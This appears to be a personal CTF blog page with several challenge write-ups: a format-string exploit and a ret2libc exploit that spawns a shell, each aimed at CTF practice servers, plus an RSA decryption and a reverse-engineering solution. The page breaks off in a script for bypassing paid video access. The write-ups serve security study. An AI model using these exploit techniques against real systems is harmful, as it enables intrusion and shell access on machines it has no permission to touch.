+      <meta itemprop="description" content="linkpwn的学习经历">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网络幻影">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/02/10/jarvisoj-fm-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" class="post-title-link" itemprop="url">jarvisoj_fm(格式化字符串)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-02-10 19:19:53" itemprop="dateCreated datePublished" datetime="2025-02-10T19:19:53+08:00">2025-02-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-20 10:30:01" itemprop="dateModified" datetime="2025-06-20T10:30:01+08:00">2025-06-20</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h1><ol>
+<li><p>首先可以去了解一下格式化话字符串漏洞看看<a target="_blank" rel="noopener" href="https://www.cnblogs.com/falling-dusk/p/17858030.html">佬的博客</a></p>
+</li>
+<li><p>可以利用格式化字符串漏洞<br><img src="/2025/02/10/jarvisoj-fm-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/1.png" alt="1"></p>
+</li>
+<li><p>先查看偏移量（aaaa与0x61616161之间的距离,0x61是a的ASCII值）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaa %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/02/10/jarvisoj-fm-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/2.png" alt="2"></p>
+</li>
+<li><p>查找x的地址<br><img src="/2025/02/10/jarvisoj-fm-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/3.png" alt="3"></p>
+</li>
+<li><p>构造exp.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(arch=&#x27;i386&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./fm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">26501</span>)</span><br><span class="line"></span><br><span class="line">x = <span class="number">0x0804A02C</span></span><br><span class="line">payload = p32(x)+<span class="string">b&quot;%11$hhn&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>得到flag<br><img src="/2025/02/10/jarvisoj-fm-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/4.png" alt="4"></p>
+</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/02/06/BUUCTF-%E9%80%86%E5%90%91-rsa/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="linkpwn">
+      <meta itemprop="description" content="linkpwn的学习经历">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网络幻影">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/02/06/BUUCTF-%E9%80%86%E5%90%91-rsa/" class="post-title-link" itemprop="url">BUUCTF-逆向-rsa</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-02-06 23:27:48" itemprop="dateCreated datePublished" datetime="2025-02-06T23:27:48+08:00">2025-02-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-20 10:24:01" itemprop="dateModified" datetime="2025-06-20T10:24:01+08:00">2025-06-20</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/re/" itemprop="url" rel="index"><span itemprop="name">re</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h1><p>1.先了解rsa加密是什么<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_51607907/article/details/123884953">rsa</a></p>
+<p>2.打开pub_key(就是公钥)，用<a target="_blank" rel="noopener" href="http://tool.chacuo.net/cryptrsakeyparse">在线网站</a>可以得到n和e</p>
+<p><img src="/2025/02/06/BUUCTF-%E9%80%86%E5%90%91-rsa/1.png" alt="1"></p>
+<p>3.再用<a target="_blank" rel="noopener" href="http://www.factordb.com/index.php">在线网站</a>,得到p和q。</p>
+<p>首先给出的n(C0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDD)是16进制，<a target="_blank" rel="noopener" href="https://www.sojson.com/hexconvert/16to10.html">换成十进制</a>。</p>
+<p><img src="/2025/02/06/BUUCTF-%E9%80%86%E5%90%91-rsa/2.png" alt="2"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import rsa</span><br><span class="line"></span><br><span class="line"># 已知的RSA参数</span><br><span class="line">e = 65537</span><br><span class="line">n = 86934482296048119190666062003494800588905656017203025617216654058378322103517</span><br><span class="line">p = 285960468890451637935629440372639283459</span><br><span class="line">q = 304008741604601924494328155975272418463</span><br><span class="line"></span><br><span class="line"># 计算φ(n)</span><br><span class="line">phi_n = (p - 1) * (q - 1)</span><br><span class="line"></span><br><span class="line"># 计算私钥d</span><br><span class="line">d = int(gmpy2.invert(e, phi_n))</span><br><span class="line"></span><br><span class="line"># 使用p, q, e, d生成私钥对象</span><br><span class="line">private_key = rsa.PrivateKey(n, e, d, p, q)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    # 加载密文</span><br><span class="line">    with open(&#x27;D:\\桌面\\41c4e672-98c5-43e5-adf4-49d75db307e4\\output\\flag.txt&#x27;, &quot;rb&quot;) as file:</span><br><span class="line">        ciphertext = file.read()</span><br><span class="line"></span><br><span class="line">    # 尝试解密</span><br><span class="line">    decrypted_message = rsa.decrypt(ciphertext, private_key)</span><br><span class="line">    print(&quot;解密后的消息: &quot;, decrypted_message.decode())</span><br><span class="line"></span><br><span class="line">except rsa.DecryptionError as de:</span><br><span class="line">    print(&quot;解密失败: 解密错误 - &quot;, str(de))</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(&quot;解密失败: 其他错误 - &quot;, str(e))</span><br></pre></td></tr></table></figure>
+
+<p>解得flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;decrypt_256&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/01/30/pwn31/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="linkpwn">
+      <meta itemprop="description" content="linkpwn的学习经历">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网络幻影">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/01/30/pwn31/" class="post-title-link" itemprop="url">pwn31</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-01-30 21:02:01" itemprop="dateCreated datePublished" datetime="2025-01-30T21:02:01+08:00">2025-01-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-20 10:32:22" itemprop="dateModified" datetime="2025-06-20T10:32:22+08:00">2025-06-20</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="pwn31"><a href="#pwn31" class="headerlink" title="pwn31"></a>pwn31</h1><ol>
+<li><p>先用IDA打开，并分析</p>
+<p><img src="/2025/01/30/pwn31/1.png" alt="1"></p>
+</li>
+</ol>
+<p>​       <img src="/2025/01/30/pwn31/2.png" alt="2"></p>
+<p>2.在用checksec检查一下<br>      <img src="/2025/01/30/pwn31/3.png" alt="3"></p>
+<p>3.首先我们可以用泄露的main地址减去真实的main地址，就可以得到偏移值<br>4.我们先可以通IDA找到偏移值</p>
+<p><img src="/2025/01/30/pwn31/6.png" alt="6"></p>
+<p>5.通过got表中puts函数的地址打印出puts函数真实的地址<br>6.泄露出puts的地址，因为，在ctfshow函数了，函数的最后有一个mov ebx，DWORD PTR[ebp-0x4]<br>那么ebx是怎么得来的呢？是通过__x86.get_pc_thunk.bx这个东西得来的，这个东西的作用是将下一条指令的地址赋给ebx寄存器，然后通过加上一个偏移，得到当前进程GOT表的地址，并以此作为后续操作的基地址。这个pwn程序的GOT表地址为0x1fc0，则ebx &#x3D; base_addr + 0x1fc0，这个是摘取<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_52635170/article/details/131304799">大佬的wp</a>。<br><img src="/2025/01/30/pwn31/5.png" alt="5"></p>
+<p>7.先查pwn的got表的地址<br><img src="/2025/01/30/pwn31/4.png" alt="4"></p>
+<p>8.然后就可以编写payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">r = remote(<span class="string">&quot;ip&quot;</span>,端口)</span><br><span class="line"><span class="comment">#r = process(&quot;./pwn&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">main_real_addr= <span class="built_in">int</span>(r.recv().strip(),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_real_addr))</span><br><span class="line">base_addr = main_real_addr - elf.sym[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">puts_plt = base_addr + elf.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = base_addr + elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">ctfshow_addr = base_addr + elf.sym[<span class="string">&quot;ctfshow&quot;</span>]</span><br><span class="line">ebx = base_addr + <span class="number">0x1fc0</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">132</span> + p32(ebx) + <span class="string">b&#x27;B&#x27;</span>*<span class="number">4</span> + p32(puts_plt) + p32(main_real_addr) + p32(puts_got)</span><br><span class="line">r.sendline(payload1)</span><br><span class="line">puts_addr = u32(r.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">140</span> + p32(system) + p32(ctfshow_addr) + p32(bin_sh )</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>得到flag<br><img src="/2025/01/30/pwn31/7.png" alt="7"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/01/25/watevrCTF-2019-esreveR/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="linkpwn">
+      <meta itemprop="description" content="linkpwn的学习经历">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网络幻影">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/01/25/watevrCTF-2019-esreveR/" class="post-title-link" itemprop="url">[watevrCTF 2019]esreveR</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-01-25 22:24:16 / 修改时间：22:53:03" itemprop="dateCreated datePublished" datetime="2025-01-25T22:24:16+08:00">2025-01-25</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="watevrCTF-2019-esreveR"><a href="#watevrCTF-2019-esreveR" class="headerlink" title="[watevrCTF 2019]esreveR"></a>[watevrCTF 2019]esreveR</h1><p>1.用IDA打开发现有问题，就放入010看了一下，发现ELF文件</p>
+<ul>
+<li>1.可以改后缀</li>
+<li>2.可以选择IDA的打开方式</li>
+</ul>
+<p>2.打开后发现前的函数几乎都是类似</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return 2 * a1 + 3 * (a1 ^ 0x107503DE) - a1;</span><br></pre></td></tr></table></figure>
+
+<p>的运算。<br>3.因此接着看到输入和判断的部分<br><img src="/2025/01/25/watevrCTF-2019-esreveR/1.png" alt="1"></p>
+<p>再进入sub_55BAA98012D8<br>4.<img src="/2025/01/25/watevrCTF-2019-esreveR/2.png" alt="2"></p>
+<p>再进入sub_55BAA9800BA0<br>5.<img src="/2025/01/25/watevrCTF-2019-esreveR/3.png" alt="3"></p>
+<p>在linux上动调随便输入可以看到IDA中</p>
+<p><img src="/2025/01/25/watevrCTF-2019-esreveR/4.png" alt="4"></p>
+<p>6.将框里的(下面还有)提出来以字符串的形式输出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include&lt;string.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">   char a[] = &#123;0x7B,0x65,</span><br><span class="line">0x73,</span><br><span class="line">0x72,</span><br><span class="line">0x65,</span><br><span class="line">0x76,</span><br><span class="line">0x65,</span><br><span class="line">0x72,</span><br><span class="line">0x5F,</span><br><span class="line">0x72,</span><br><span class="line">0x65,</span><br><span class="line">0x76,</span><br><span class="line">0x65,</span><br><span class="line">0x72,</span><br><span class="line">0x73,</span><br><span class="line">0x65,</span><br><span class="line">0x64,</span><br><span class="line">0x5F,</span><br><span class="line">0x79,</span><br><span class="line">0x6F,</span><br><span class="line">0x75,</span><br><span class="line">0x74,</span><br><span class="line">0x75,</span><br><span class="line">0x62,</span><br><span class="line">0x65,</span><br><span class="line">0x2E,</span><br><span class="line">0x63,</span><br><span class="line">0x6F,</span><br><span class="line">0x6D,</span><br><span class="line">0x2F,</span><br><span class="line">0x77,</span><br><span class="line">0x61,</span><br><span class="line">0x74,</span><br><span class="line">0x63,</span><br><span class="line">0x68,</span><br><span class="line">0x3F,</span><br><span class="line">0x76,</span><br><span class="line">0x3D,</span><br><span class="line">0x49,</span><br><span class="line">0x38,</span><br><span class="line">0x69,</span><br><span class="line">0x6A,</span><br><span class="line">0x62,</span><br><span class="line">0x34,</span><br><span class="line">0x5A,</span><br><span class="line">0x65,</span><br><span class="line">0x65,</span><br><span class="line">0x35,</span><br><span class="line">0x45,</span><br><span class="line">0x7D&#125;;</span><br><span class="line">        printf(&quot;%s&quot;,a);</span><br><span class="line">   return 0; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;esrever_reversed_youtube.com/watch?v=I8ijb4Zee5E&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/01/23/vip%E8%A7%86%E9%A2%91%E5%85%8D%E8%B4%B9%E8%A7%82%E7%9C%8Bpy%E8%84%9A%E6%9C%AC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="linkpwn">
+      <meta itemprop="description" content="linkpwn的学习经历">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网络幻影">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/01/23/vip%E8%A7%86%E9%A2%91%E5%85%8D%E8%B4%B9%E8%A7%82%E7%9C%8Bpy%E8%84%9A%E6%9C%AC/" class="post-title-link" itemprop="url">vip视频免费观看py脚本</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-01-23 20:54:15" itemprop="dateCreated datePublished" datetime="2025-01-23T20:54:15+08:00">2025-01-23</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-20 10:42:54" itemprop="dateModified" datetime="2025-06-20T10:42:54+08:00">2025-06-20</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/linkpwn%E7%9A%84%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">linkpwn的编程学习</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/linkpwn%E7%9A%84%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/python/" itemprop="url" rel="index"><span itemprop="name">python</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="今天白嫖了一个脚本不知道哪里有问题望大佬指点一下"><a href="#今天白嫖了一个脚本不知道哪里有问题望大佬指点一下" class="headerlink" title="今天白嫖了一个脚本不知道哪里有问题望大佬指点一下"></a>今天白嫖了一个脚本不知道哪里有问题望大佬指点一下</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"># url解析</span><br><span class="line"></span><br><span class="line">from urllib import parse</span><br><span class="line">import tkinter.messagebox as msgbox</span><br><span class="line">import tkinter as tk</span><br><span class="line">import webbrowser</span><br><span class="line">import re</span><br><span class="line"># python  外包  外快  5   20</span><br><span class="line"></span><br><span class="line">class APP:</span><br><span class="line">    def __init__(self, width=500, height=300):</span><br><span class="line">        self.w = width</span><br><span class="line">        self.h = height</span><br><span class="line">        self.title = &#x27; VIP视频破解助手&#x27;</span><br><span class="line">        self.root = tk.Tk(className=self.title)</span><br><span class="line">        # 定义button控件上的文字</span><br><span class="line">        self.url = tk.StringVar()</span><br><span class="line"></span><br><span class="line">        # 定义选择哪个播放源</span><br><span class="line">        self.v = tk.IntVar()</span><br><span class="line"></span><br><span class="line">        # 默认为1</span><br><span class="line">        self.v.set(1)</span><br><span class="line"></span><br><span class="line">        # Frame空间</span><br><span class="line">        frame_1 = tk.Frame(self.root)</span><br><span class="line">        frame_2 = tk.Frame(self.root)</span><br><span class="line">        frame_3 = tk.Frame(self.root)</span><br><span class="line"></span><br><span class="line">        # Menu菜单</span><br><span class="line">        menu = tk.Menu(self.root)</span><br><span class="line">        self.root.config(menu=menu)</span><br><span class="line">        moviemenu = 